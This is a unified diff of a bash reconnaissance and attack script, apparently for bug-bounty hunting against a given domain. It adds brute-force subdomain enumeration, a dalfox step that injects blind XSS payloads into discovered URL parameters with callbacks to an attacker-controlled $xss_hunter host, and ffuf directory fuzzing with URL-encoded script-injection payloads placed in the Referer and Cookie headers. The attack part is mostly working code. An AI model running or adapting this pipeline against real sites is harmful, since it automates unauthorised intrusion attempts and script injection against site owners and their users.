@@ -41,7 +41,7 @@ date
 if [ ! -f ~/recon/$1/$1-final.txt ]; then
 	echo "[+] AMASS SCANNING [+]"
 	if [ ! -f ~/recon/$1/$1-amass.txt ] && [ ! -z $(which amass) ]; then
-		amass enum -passive -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
+		amass enum -brute -w ~/tools/EnormousDNS.txt -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
 		amasscan=$(scanned ~/recon/$1/$1-amass.txt)
 		message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$1"
 		echo "[+] Amass Found $amasscan subdomains"
@@ -402,6 +402,7 @@ echo "[+] ALIENVAULT, WAYBACKURLS and COMMON CRAWL Scanning for Archived Endpoin
 if [ ! -z $(which gau) ]; then
 	for u in $(cat ~/recon/$1/$1-alive.txt);do echo $u | gau | grep "$u" >> ~/recon/$1/gau/tmp-$u.txt; done
 	cat ~/recon/$1/gau/* | sort -u | getching >> ~/recon/$1/gau/$1-gau.txt 
+	rm ~/recon/$1/gau/tmp-*
 	message "GAU%20Done%20for%20$1"
 	echo "[+] Done gau for discovering useful endpoints"
 else
@@ -410,10 +411,20 @@ else
 fi
 sleep 5
 
+echo "[+] DALFOX for injecting blindxss"
+if [ ! -z $(which dalfox) ]; then
+	 cat ~/recon/$1/$1-alive.txt | gau | grep "=" | dalfox pipe -b $xss_hunter -o ~/recon/$1/$1-dalfox.txt
+	message "DALFOX%20Done%20for%20$1"
+	echo "[+] Done dalfox for injecting blind xss"
+else
+	message "[-]%20Skipping%20DALFOX%20for%20injecting%20blind%20xss%20in%20$1"
+	echo "[!] Skipping ..."	
+fi
+sleep 5
+
 echo "[+] KXSS for potential vulnerable xss"
 if [ ! -z $(which kxss) ]; then
-	 cat ~/recon/$1/gau/tmp-* | grep "=" | kxss | grep "is reflected and allows" | awk {'print $9'} | sort -u >> ~/recon/$1/kxss/$1-kxss.txt
-	 rm ~/recon/$1/gau/tmp-*
+	 cat ~/recon/$1/$1-alive.txt | gau | grep "=" | kxss | grep "is reflected and allows" | awk {'print $9'} | sort -u >> ~/recon/$1/kxss/$1-kxss.txt
 	message "KXSS%20Done%20for%20$1"
 	echo "[+] Done kxss for potential xss"
 else
@@ -462,13 +473,13 @@ if [ ! -z $(which ffuf) ]; then
 		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
 		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
 		if [ 404 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
 		elif [ 403 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
 		elif [ 401 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
 		elif [ 200 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/recon/$1/dirsearch/$filename.html
 		else
 			echo "$i >> $stat_code"
 		fi
